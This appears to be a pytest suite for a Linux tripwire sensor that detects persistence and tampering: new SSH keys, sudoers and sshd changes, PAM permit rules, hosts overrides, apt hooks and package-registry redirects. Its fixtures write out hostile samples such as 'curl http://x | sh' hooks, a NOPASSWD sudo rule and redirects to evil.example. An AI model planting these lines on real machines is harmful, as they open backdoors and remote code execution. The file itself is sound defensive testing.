"""Tripwires: each attacker habit is caught, normal life and package updates are not, and nothing secret is stored or leaked."""
from __future__ import annotations

import json
import os
import sys
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "LinuxGuardianSuite"))

import incidents  # noqa: E402
import sensors as sn  # noqa: E402
import tripwires as tw  # noqa: E402
from test_sensors import DAY, at, box, sensor_events, stub  # noqa: E402,F401  (box is a fixture)

KEY_A = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAliceKeyBlobAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA alice@laptop"
KEY_B = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbobKeyBlobBBBBBBBBBBBBBBBBBBBBBB bob@example"


def put(p: Path, text: str, mode: int = 0o644) -> Path:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)
    p.chmod(mode)
    return p


@pytest.fixture()
def world(box, monkeypatch):
    """The sensor test box plus a dpkg stub that can claim ownership of one path (PKG_OWNED)."""
    stub(box / "bin", "dpkg", 'if [ -n "$PKG_OWNED" ] && [ "$3" = "$PKG_OWNED" ]; then echo "somepkg: $3"; exit 0; fi\necho "no" >&2; exit 1')
    return box


def look(state: dict) -> list[dict]:
    return tw.run(state)


def learn(world) -> dict:
    state: dict = {}
    assert look(state) == []                                              # the first look only learns
    return state


def names(findings: list[dict]) -> list[str]:
    return sorted(f["event"] for f in findings)


# ------------------------------------------------------------------ ssh keys
def test_ssh_keys_known_at_first_look_are_normal_and_a_new_one_is_critical(world):
    ak = put(world / "home/.ssh/authorized_keys", KEY_A + "\n", 0o600)
    state = learn(world)
    assert look(state) == []
    ak.write_text(KEY_A + "\n" + KEY_B + "\n")
    [f] = look(state)
    assert f["event"] == "tripwire_ssh_key_added" and f["severity"] == "critical" and f["technique"] == "T1098.004"
    assert "ssh-rsa bob@example" in f["message"] and f["entity"] == [str(world / "home/.ssh/authorized_keys")]
    assert look(state) == []                                              # reported once


def test_only_a_hash_of_each_key_is_kept(world):
    put(world / "home/.ssh/authorized_keys", KEY_A + "\n")
    state = learn(world)
    blob = json.dumps(state)
    assert "AliceKeyBlob" not in blob and len(state["tripwires"]["ssh_keys"]) == 1


def test_key_options_forced_commands_and_odd_comments(world):
    put(world / "home/.ssh/authorized_keys", "")
    state = learn(world)
    put(world / "home/.ssh/authorized_keys",
        '# comment line\n\ncommand="/bin/backup",no-pty ssh-ed25519 AAAAForcedBlob forced@x\nssh-ed25519 AAAAEvilBlob evil\x1b[31m\x00name\n')
    msgs = [f["message"] for f in look(state)]
    assert len(msgs) == 2 and any("(forced command)" in m for m in msgs) and not any("\x1b" in m or "\x00" in m for m in msgs)


def test_removing_a_key_or_reordering_is_not_an_alert(world):
    ak = put(world / "home/.ssh/authorized_keys", KEY_A + "\n" + KEY_B + "\n")
    state = learn(world)
    ak.write_text(KEY_B + "\n" + KEY_A + "\n")
    assert look(state) == []
    ak.write_text(KEY_A + "\n")
    assert look(state) == []


def test_authorized_keys2_and_a_missing_file_are_handled(world):
    state = learn(world)                                                  # no ~/.ssh at all
    put(world / "home/.ssh/authorized_keys2", KEY_B + "\n")
    assert names(look(state)) == ["tripwire_ssh_key_added"]


# ----------------------------------------------------------------------- sudo
def test_sudoers_changes_are_noticed_even_though_the_files_are_unreadable(world):
    s = put(world / "etc/sudoers", "root ALL=(ALL:ALL) ALL\n", 0o000)
    state = learn(world)
    assert not os.access(s, os.R_OK) or os.getuid() == 0
    put(world / "etc/sudoers.d/90-evil", "me ALL=(ALL) NOPASSWD: ALL\n", 0o000)
    [f] = look(state)
    assert f["event"] == "tripwire_changed" and f["severity"] == "warning" and "sudo rules" in f["message"] and "no package owns it" in f["message"]
    assert "NOPASSWD" not in json.dumps(state)                           # root-only files are never read
    s.chmod(0o600)
    s.write_text("root ALL=(ALL:ALL) ALL\nme ALL=(ALL) NOPASSWD: ALL\n")
    s.chmod(0o000)
    [g] = look(state)
    assert g["severity"] == "warning" and "changed" in g["message"]


def test_a_package_installed_file_is_information_not_an_alert(world, monkeypatch):
    state = learn(world)
    p = put(world / "etc/sudoers.d/README", "# docs\n", 0o000)
    monkeypatch.setenv("PKG_OWNED", str(p))
    [f] = look(state)
    assert f["severity"] == "info" and "installed by the package somepkg" in f["message"]


# ----------------------------------------------------------------------- sshd
def test_dangerous_sshd_settings_are_critical_only_when_newly_introduced(world):
    cfg = put(world / "etc/ssh/sshd_config", "PermitRootLogin yes\nPort 22\n")
    state = learn(world)                                                  # already there at first look: normal for this machine
    assert look(state) == []
    cfg.write_text("PermitRootLogin yes\nPermitEmptyPasswords yes\nPasswordAuthentication yes\n# PermitRootLogin yes\nAuthorizedKeysFile /tmp/keys\n")
    found = {f["message"].split(":")[1].split("(")[0].strip(): f["severity"] for f in look(state)}
    assert len(found) == 3
    sev = sorted(found.values())
    assert sev == ["critical", "warning", "warning"]


def test_sshd_defaults_and_comments_are_quiet(world):
    cfg = put(world / "etc/ssh/sshd_config", "Port 22\n")
    state = learn(world)
    cfg.write_text("Port 22\n#PermitEmptyPasswords yes\nAuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2\nPermitRootLogin prohibit-password\n")
    [f] = look(state)
    assert f["event"] == "tripwire_changed" and f["severity"] == "info"


def test_a_new_dropin_with_a_dangerous_setting_is_flagged(world):
    state = learn(world)
    put(world / "etc/ssh/sshd_config.d/99-x.conf", "PermitEmptyPasswords yes\n")
    [f] = look(state)
    assert f["event"] == "tripwire_risky_setting" and f["severity"] == "critical"


# ----------------------------------------------------------------- ssh client
def test_ssh_client_commands_are_flagged_when_added(world):
    cfg = put(world / "home/.ssh/config", "Host work\n  ProxyCommand ssh -W %h:%p bastion\n")
    state = learn(world)
    assert look(state) == []
    cfg.write_text("Host work\n  ProxyCommand ssh -W %h:%p bastion\nHost *\n  LocalCommand curl http://x | sh\n  PermitLocalCommand yes\nMatch exec \"test -f /x\"\n")
    msgs = [f["message"] for f in look(state)]
    assert len(msgs) == 3 and all("SSH client" in m for m in msgs)


# ------------------------------------------------------------------------ PAM
def test_pam_rules_that_accept_everyone_are_critical(world):
    pam = put(world / "etc/pam.d/sshd", "auth required pam_unix.so\naccount required pam_permit.so\n")
    state = learn(world)
    pam.write_text("auth sufficient pam_permit.so\nauth required pam_unix.so\naccount required pam_permit.so\n")
    [f] = look(state)
    assert f["event"] == "tripwire_risky_setting" and f["severity"] == "critical" and "accepts everyone" in f["message"]


def test_pam_exec_and_ordinary_changes(world):
    pam = put(world / "etc/pam.d/login", "auth required pam_unix.so\n")
    state = learn(world)
    pam.write_text("auth required pam_unix.so\nsession optional pam_exec.so /usr/local/bin/hook\n")
    [f] = look(state)
    assert f["severity"] == "warning" and "runs a program" in f["message"]
    pam.write_text("auth required pam_unix.so\nsession optional pam_exec.so /usr/local/bin/hook\n# harmless comment\n")
    [g] = look(state)
    assert g["event"] == "tripwire_changed" and g["severity"] == "info"


# ---------------------------------------------------------------------- hosts
def test_hosts_overrides_are_flagged_localhost_is_not(world):
    h = put(world / "etc/hosts", "127.0.0.1 localhost\n127.0.1.1 mybox\n::1 ip6-localhost\n")
    state = learn(world)
    h.write_text("127.0.0.1 localhost\n127.0.1.1 mybox\n::1 ip6-localhost\n0.0.0.0 ads.example\n203.0.113.9 mybank.example www.mybank.example\n")
    [f] = look(state)
    assert f["event"] == "tripwire_risky_setting" and "mybank.example" in f["message"] and "ads.example" not in f["message"]


# ---------------------------------------------------- modules, login env, polkit
@pytest.mark.parametrize("rel,group", [("etc/modules-load.d/evil.conf", "kernel modules"), ("etc/modprobe.d/x.conf", "kernel modules"),
                                        ("etc/profile.d/zz.sh", "login environment"), ("etc/ld.so.conf.d/x.conf", "login environment"),
                                        ("etc/polkit-1/rules.d/10-x.rules", "polkit")])
def test_new_unowned_system_files_are_warnings(world, rel, group):
    state = learn(world)
    put(world / rel, "x\n")
    [f] = look(state)
    assert f["severity"] == "warning" and group in f["message"] and f["event"] == "tripwire_changed"


# ------------------------------------------------------------------------ apt
def test_apt_hooks_that_run_commands_are_critical_unless_a_package_owns_them(world, monkeypatch):
    state = learn(world)
    put(world / "etc/apt/apt.conf.d/99evil", 'APT::Update::Post-Invoke { "curl http://x/y | sh"; };\n')
    [f] = look(state)
    assert f["event"] == "tripwire_risky_setting" and f["severity"] == "critical" and "every time you update" in f["message"]
    own = put(world / "etc/apt/apt.conf.d/50package", 'DPkg::Post-Invoke { "/usr/bin/update-notifier"; };\n')
    monkeypatch.setenv("PKG_OWNED", str(own))
    out = look(state)
    assert not [x for x in out if "50package" in json.dumps(x)]


def test_new_software_sources_and_keys_are_warnings(world):
    state = learn(world)
    put(world / "etc/apt/sources.list.d/ppa-thing.list", "deb http://ppa.example/ubuntu jammy main\n")
    put(world / "etc/apt/trusted.gpg.d/thing.gpg", "binary-ish")
    found = look(state)
    assert len(found) == 2 and all(f["severity"] == "warning" and "software sources" in f["message"] for f in found)


# ---------------------------------------------------------------- tool configs
def test_package_index_redirects_are_flagged_without_leaking_credentials(world):
    pip = put(world / "home/.config/pip/pip.conf", "[global]\nindex-url = https://pypi.org/simple\n")
    npmrc = put(world / "home/.npmrc", "registry=https://registry.npmjs.org/\n")
    state = learn(world)
    assert look(state) == []
    pip.write_text("[global]\nindex-url = https://pypi.org/simple\nextra-index-url = https://deploy:SuperSecret99@evil.example/simple\ntrusted-host = evil.example\n")
    npmrc.write_text("registry=https://npm.evil.example/\n//npm.evil.example/:_authToken=npm_SECRETTOKEN123\n")
    found = look(state)
    blob = json.dumps(found) + json.dumps(state)
    assert any("pip downloads packages from evil.example" in f["message"] for f in found)
    assert any("npm/yarn downloads packages from npm.evil.example" in f["message"] for f in found)
    assert "SuperSecret99" not in blob and "SECRETTOKEN123" not in blob


def test_trusted_indexes_and_unrelated_edits_are_quiet(world):
    pip = put(world / "home/.config/pip/pip.conf", "[global]\n")
    state = learn(world)
    pip.write_text("[global]\nindex-url = https://download.pytorch.org/whl/cu121\ndisable-pip-version-check = true\n")
    assert look(state) == []


def test_git_settings_that_run_programs_are_flagged(world):
    g = put(world / "home/.gitconfig", "[user]\n  name = me\n")
    state = learn(world)
    g.write_text("[user]\n  name = me\n[core]\n  sshCommand = /tmp/wrapper\n  hooksPath = /tmp/hooks\n[alias]\n  st = status\n  deploy = !sh -c 'curl x | sh'\n"
                 "[url \"https://evil.example/\"]\n  insteadOf = https://github.com/\n")
    msgs = " | ".join(f["message"] for f in look(state))
    assert "sshCommand" in msgs and "hooksPath" in msgs and "alias or helper runs a shell command" in msgs and "rewrites repository addresses" in msgs
    assert "st = status" not in msgs


def test_cargo_registry_replacement(world):
    c = put(world / "home/.cargo/config.toml", "[net]\nretry = 2\n")
    state = learn(world)
    c.write_text("[net]\nretry = 2\n[source.crates-io]\nreplace-with = \"mirror\"\n[source.mirror]\nregistry = \"https://crates.evil.example/index\"\n")
    msgs = [f["message"] for f in look(state)]
    assert any("cargo downloads crates from" in m and "evil.example" in m for m in msgs)


# ------------------------------------------------------------------- behaviour
def test_everything_quiet_when_nothing_changes_and_snapshots_are_stable(world):
    put(world / "etc/hosts", "127.0.0.1 localhost\n")
    put(world / "etc/ssh/sshd_config", "Port 22\n")
    put(world / "home/.ssh/authorized_keys", KEY_A + "\n")
    state = learn(world)
    for _ in range(3):
        assert look(state) == []


def test_findings_have_stable_unique_keys_so_the_sensor_can_deduplicate(world):
    state = learn(world)
    put(world / "etc/modules-load.d/a.conf", "a\n")
    put(world / "etc/modules-load.d/b.conf", "b\n")
    keys = [f["key"] for f in look(state)]
    assert len(keys) == len(set(keys)) == 2
    assert all(k.startswith("tw:") for k in keys)


def test_unreadable_files_and_folders_never_break_the_look(world):
    (world / "etc/pam.d").mkdir(parents=True, exist_ok=True)
    put(world / "etc/pam.d/x", "auth required pam_unix.so\n", 0o000)
    put(world / "home/.ssh/config", "Host a\n", 0o000)
    state = learn(world)
    assert look(state) == []


# ------------------------------------------------------- sensor + incidents
def test_the_sensor_learns_then_reports_a_new_ssh_key_with_its_own_story(world, monkeypatch):
    put(world / "home/.ssh/authorized_keys", KEY_A + "\n")
    sn.run_once()
    assert sensor_events(world) == []
    put(world / "home/.ssh/authorized_keys", KEY_A + "\n" + KEY_B + "\n")
    at(monkeypatch, 600)
    sn.run_once()
    [e] = sensor_events(world)
    assert e["event"] == "tripwire_ssh_key_added" and e["severity"] == "critical" and e["stage"] == "persistence"
    [inc] = incidents.build(days=7, directory=world / "lg" / "incidents", now=time.time() + 60)
    assert inc.title == "A new SSH key can log in as you" and inc.severity == "critical"
    at(monkeypatch, 1200)
    sn.run_once()
    assert len(sensor_events(world)) == 1


def test_a_risky_change_gets_its_own_story_and_the_tripwire_sensor_is_listed(world, monkeypatch):
    put(world / "etc/ssh/sshd_config", "Port 22\n")
    sn.run_once()
    put(world / "etc/ssh/sshd_config", "Port 22\nPermitEmptyPasswords yes\n")
    at(monkeypatch, 600)
    sn.run_once()
    [inc] = incidents.build(days=7, directory=world / "lg" / "incidents", now=time.time() + 60)
    assert inc.title == "A setting that weakens security was introduced"
    assert {"tripwires", "decoys"} <= {s["name"] for s in sn.status()["sensors"]}


def test_cli(world, capsys, monkeypatch):
    monkeypatch.setattr(sys, "argv", ["tripwires.py", "--check"])
    assert tw.main() == 0 and "First look" in capsys.readouterr().out
    put(world / "home/.ssh/authorized_keys", KEY_B + "\n")
    assert tw.main() == 0 and "[critical]" in capsys.readouterr().out
    monkeypatch.setattr(sys, "argv", ["tripwires.py", "--list"])
    assert tw.main() == 0 and "sudo rules" in capsys.readouterr().out


def test_a_package_changing_one_of_its_own_files_is_information(world, monkeypatch):
    f = put(world / "etc/polkit-1/rules.d/10-pkg.rules", "a\n")
    state = learn(world)
    f.write_text("bb\n")
    monkeypatch.setenv("PKG_OWNED", str(f))
    [x] = look(state)
    assert x["severity"] == "info" and "owned by the package somepkg" in x["message"]
    f.write_text("ccc\n")
    monkeypatch.delenv("PKG_OWNED")
    [y] = look(state)
    assert y["severity"] == "warning"


def test_root_only_files_are_judged_by_size_and_time_even_when_readable(world):
    s = put(world / "etc/sudoers", "root ALL=(ALL:ALL) ALL\n", 0o644)
    state = learn(world)
    assert state["tripwires"]["files"][str(s)]["sig"].startswith("stat:")
    assert state["tripwires"]["files"][str(world / "etc/hosts")]["sig"].startswith("sha:") if (world / "etc/hosts").exists() else True
    put(world / "etc/hosts", "127.0.0.1 localhost\n")
    assert next(v for k, v in learn(world)["tripwires"]["files"].items() if k.endswith("hosts"))["sig"].startswith("sha:")


def test_a_pip_index_with_credentials_shows_only_the_host(world):
    pip = put(world / "home/.config/pip/pip.conf", "[global]\n")
    state = learn(world)
    pip.write_text("[global]\nextra-index-url = https://deploy:SuperSecret99@evil.example/simple\n")
    [f] = look(state)
    assert "pip downloads packages from evil.example" in f["message"] and "SuperSecret99" not in json.dumps(f) and "deploy" not in f["message"]


def test_new_loopback_entries_in_hosts_are_not_flagged(world):
    h = put(world / "etc/hosts", "127.0.0.1 localhost\n")
    state = learn(world)
    h.write_text("127.0.0.1 localhost\n127.0.0.1 myservice.test\n127.0.2.1 other.test\n")
    [f] = look(state)
    assert f["event"] == "tripwire_changed"                               # the file changed, but nothing was redirected


def test_a_new_benign_tool_config_file_is_not_news(world):
    state = learn(world)
    put(world / "home/.npmrc", "save-exact=true\n")
    put(world / "home/.gitconfig", "[user]\n  name = me\n")
    assert look(state) == []
